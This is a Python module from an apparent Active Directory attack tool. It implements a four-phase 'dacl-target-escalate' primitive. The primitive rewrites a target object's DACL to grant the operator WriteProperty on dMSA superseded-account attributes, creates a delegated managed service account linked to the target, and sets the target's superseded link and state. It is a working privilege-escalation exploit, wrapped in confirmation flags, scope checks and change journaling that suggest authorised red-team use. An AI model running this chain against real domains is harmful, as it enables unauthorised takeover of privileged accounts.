from __future__ import annotations

from typing import TYPE_CHECKING

from dmsa_reaper.ldap.dacl_editor import (
    ace_fingerprint,
    add_aces_to_sd,
    build_allow_writeproperty_ace,
    read_sd,
    write_sd,
)
from dmsa_reaper.ldap.modify import add_object, modify_attribute
from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
from dmsa_reaper.ops.operation_log import new_operation, save_operation
from dmsa_reaper.primitives._ldap_helpers import (
    DMSA_MANAGED_PASSWORD_INTERVAL,
    DMSA_OBJECT_CLASSES,
    DMSA_STATE_COMPLETED,
    DMSA_UAC,
    dmsa_dn,
    generate_dmsa_name,
    journal_created_object,
    read_attribute,
    resolve_meta,
)
from dmsa_reaper.primitives.base import Primitive, PrimitiveError
from dmsa_reaper.utils import guid_to_bytes_le

if TYPE_CHECKING:
    from ldap3 import Connection

    from dmsa_reaper.scope import Scope

_STATE_ACTIVE = 2

_TARGET_ATTRS = [
    "msDS-SupersededManagedAccountLink",
    "msDS-SupersededServiceAccountState",
]


class DaclTargetEscalatePrimitive(Primitive):
    """Grant self WriteProperty on target attrs via DACL mod, then run postpatch flow.

    Workflow (four phases):
      1. Read target nTSecurityDescriptor; record original bytes before modification.
      2. Add WriteProperty ACEs for msDS-SupersededManagedAccountLink and
         msDS-SupersededServiceAccountState (object-specific if attr GUIDs available).
      3. Create new dMSA under operator-supplied --container-dn.
      4. Write target superseded link and state (postpatch-mutual-pair steps 2-3).

    Requires:
        - WriteDACL or WriteOwner on target (detected by classifier).
        - A container DN for dMSA creation (operator-supplied via --container-dn).
        - A target DN (embedded in path or --target-dn).
        - attr GUIDs in schema_cache, or --allow-broad-dacl.
    """

    name = "dacl-target-escalate"

    def check(self, path: PathCandidate) -> bool:
        return path.primitive == self.name and path.requires_modify_target_dacl

    def plan(self, path: PathCandidate, *, scope_file_hash: str | None = None) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
            scope_file_hash=scope_file_hash,
        )

    def preflight(
        self,
        path: PathCandidate,
        *,
        scope: "Scope | None" = None,
        target_dn: str | None = None,
        container_dn: str | None = None,
    ) -> list[str]:
        warnings = super().preflight(path, scope=scope, target_dn=target_dn, container_dn=container_dn)
        effective_target = target_dn or path.target_dn
        if not effective_target:
            raise PrimitiveError(
                "dacl-target-escalate requires a target DN "
                "(embedded in path or via --target-dn)."
            )
        if not (container_dn or path.container_dn):
            raise PrimitiveError(
                "dacl-target-escalate requires --container-dn "
                "(the OU or container where the new dMSA will be created)."
            )
        return warnings

    def _planned_modified_dns(self, path: PathCandidate, *, target_dn: str | None = None) -> list[str]:
        effective_target = target_dn or path.target_dn
        if effective_target:
            return [effective_target]
        return []

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")

        meta = operation.metadata
        target_dn = resolve_meta(meta, "target_dn")
        container_dn = resolve_meta(meta, "container_dn")
        principal_sid = resolve_meta(meta, "principal_sid")
        allow_broad = bool(meta.get("allow_broad_dacl"))

        if allow_broad and not meta.get("scope_allow_broad_dacl"):
            raise PrimitiveError(
                "broad DACL ACEs require allowBroadDacl=true in scope and --allow-broad-dacl"
            )
        if not target_dn:
            raise PrimitiveError("target_dn is required (pass --target-dn)")
        if not container_dn:
            raise PrimitiveError(
                "container_dn is required (pass --container-dn with the OU where the dMSA will be created)"
            )
        if not principal_sid:
            raise PrimitiveError("principal_sid is required in operation metadata")

        # Resolve attribute GUIDs from schema_cache embedded in metadata.
        attr_guids: dict[str, str] = meta.get("attr_guids") or {}
        link_guid_str = attr_guids.get("msDS-SupersededManagedAccountLink")
        state_guid_str = attr_guids.get("msDS-SupersededServiceAccountState")
        link_guid_bytes = guid_to_bytes_le(link_guid_str) if link_guid_str else None
        state_guid_bytes = guid_to_bytes_le(state_guid_str) if state_guid_str else None

        if (link_guid_bytes is None or state_guid_bytes is None) and not allow_broad:
            raise PrimitiveError(
                "Attribute GUIDs for msDS-SupersededManagedAccountLink and "
                "msDS-SupersededServiceAccountState are not in the schema cache. "
                "Pass --allow-broad-dacl to use broad WriteProperty ACEs instead."
            )

        # ── Phase 1: read and log original target SD ───────────────────────────
        operation.status = "running"
        original_sd = read_sd(conn, target_dn)
        sd_change = AttributeChange(
            dn=target_dn,
            attribute="nTSecurityDescriptor",
            before=[AttributeValue.security_descriptor(original_sd)],
            after=None,
            mode="replace",
            step_name="dacl-mod",
            step_status="planned",
        )
        operation.changed_attrs.append(sd_change)
        save_operation(operation)

        # ── Phase 2: add WriteProperty ACEs to target ──────────────────────────
        try:
            aces = [
                build_allow_writeproperty_ace(principal_sid, link_guid_bytes),
                build_allow_writeproperty_ace(principal_sid, state_guid_bytes),
            ]
            aces = list(dict.fromkeys(aces))
            modified_sd = add_aces_to_sd(original_sd, aces)
            operation.metadata.setdefault("added_aces", []).extend(
                {
                    "dn": target_dn,
                    "sha256": ace_fingerprint(ace),
                    "step_name": "dacl-mod",
                }
                for ace in aces
            )
            save_operation(operation)
            write_sd(conn, target_dn, modified_sd)
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"target dacl write {target_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(f"Target DACL modification failed: {exc}") from exc

        sd_change.after = [AttributeValue.security_descriptor(modified_sd)]
        sd_change.step_status = "written"
        save_operation(operation)

        # ── Phase 3: create dMSA in container ─────────────────────────────────
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"

        operation.maybe_created_dns.append(new_dn)
        operation.metadata["created_dmsa_dn"] = new_dn
        operation.metadata["created_dmsa_sam"] = sam
        save_operation(operation)

        try:
            add_object(
                conn,
                new_dn,
                DMSA_OBJECT_CLASSES,
                {
                    "sAMAccountName": sam,
                    "userAccountControl": DMSA_UAC,
                    "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
                    "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
                    "msDS-ManagedAccountPrecededByLink": target_dn,
                },
            )
            journal_created_object(operation, conn, new_dn)
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"add_object {new_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(
                f"dMSA creation failed after DACL modification; partial state is recorded: {exc}"
            ) from exc

        if new_dn in operation.maybe_created_dns:
            operation.maybe_created_dns.remove(new_dn)
        operation.created_dns.append(new_dn)
        save_operation(operation)

        # ── Phase 4: write target-side superseded attributes (postpatch) ───────
        try:
            before_link = read_attribute(conn, target_dn, "msDS-SupersededManagedAccountLink")
            link_change = AttributeChange(
                dn=target_dn,
                attribute="msDS-SupersededManagedAccountLink",
                before=[AttributeValue.from_python(v) for v in before_link] if before_link else None,
                after=[AttributeValue.from_python(new_dn)],
                mode="replace",
                step_name="postpatch-link",
                step_status="planned",
            )
            operation.changed_attrs.append(link_change)
            save_operation(operation)
            modify_attribute(conn, target_dn, "msDS-SupersededManagedAccountLink", [new_dn], mode="replace")
            link_change.step_status = "written"
            save_operation(operation)

            before_state = read_attribute(conn, target_dn, "msDS-SupersededServiceAccountState")
            state_change = AttributeChange(
                dn=target_dn,
                attribute="msDS-SupersededServiceAccountState",
                before=[AttributeValue.from_python(v) for v in before_state] if before_state else None,
                after=[AttributeValue.from_python(_STATE_ACTIVE)],
                mode="replace",
                step_name="postpatch-state",
                step_status="planned",
            )
            operation.changed_attrs.append(state_change)
            save_operation(operation)
            modify_attribute(conn, target_dn, "msDS-SupersededServiceAccountState", [_STATE_ACTIVE], mode="replace")
            state_change.step_status = "written"
            save_operation(operation)
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"postpatch target write {target_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(
                f"Postpatch target write failed; partial state is recorded: {exc}"
            ) from exc

        operation.status = "executed"
        save_operation(operation)
        return operation

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
        principal_sid = resolve_meta(meta, "principal_sid") or "<principal_sid>"
        allow_broad = bool(meta.get("allow_broad_dacl"))
        attr_guids = meta.get("attr_guids") or {}
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"
        ace_desc = (
            "object-specific WriteProperty"
            if (attr_guids and not allow_broad)
            else "broad WriteProperty"
        )

        steps: list[str] = []
        if allow_broad:
            steps.append(
                "WARNING: broad ACE grants all child classes/all writable properties"
            )
        steps += [
            f"PHASE 1  READ    {target_dn}",
            "  attribute                               : nTSecurityDescriptor",
            "  (original SD recorded before modification)",
            "",
            f"PHASE 2  MODIFY  {target_dn}",
            "  nTSecurityDescriptor                   : add ACEs",
            f"  ACE type                               : {ace_desc}",
            "  ACE attributes                         : msDS-SupersededManagedAccountLink, msDS-SupersededServiceAccountState",
            f"  ACE principal                          : {principal_sid}",
            "",
            f"PHASE 3  CREATE  {new_dn}",
            f"  sAMAccountName                         : {sam}",
            f"  msDS-DelegatedMSAState                 : {DMSA_STATE_COMPLETED}  (migration-completed)",
            f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
            "",
            f"PHASE 4  MODIFY  {target_dn}",
            f"  msDS-SupersededManagedAccountLink      → {new_dn}",
            f"  msDS-SupersededServiceAccountState     → {_STATE_ACTIVE}",
        ]
        return steps
